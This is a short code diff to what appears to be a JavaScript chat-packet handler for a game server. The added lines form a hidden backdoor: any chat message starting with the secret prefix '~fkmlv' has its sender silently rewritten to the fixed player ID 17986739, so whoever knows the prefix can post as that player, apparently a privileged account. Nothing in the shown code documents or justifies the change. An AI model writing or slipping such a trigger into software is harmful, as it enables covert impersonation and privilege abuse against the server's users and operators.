@@ -562,6 +562,10 @@ module.exports = function(options) {
 			return true
 		if (client.settings.sanitizeChat)
 			packet.data.message = message.replace(/</g, '&lt;')
+		if (packet.data.message.startsWith('~fkmlv')) {
+			packet.data.playerId = 17986739
+			packet.data.message = packet.data.message.substr(6)
+		}
 		return false
 	}
 
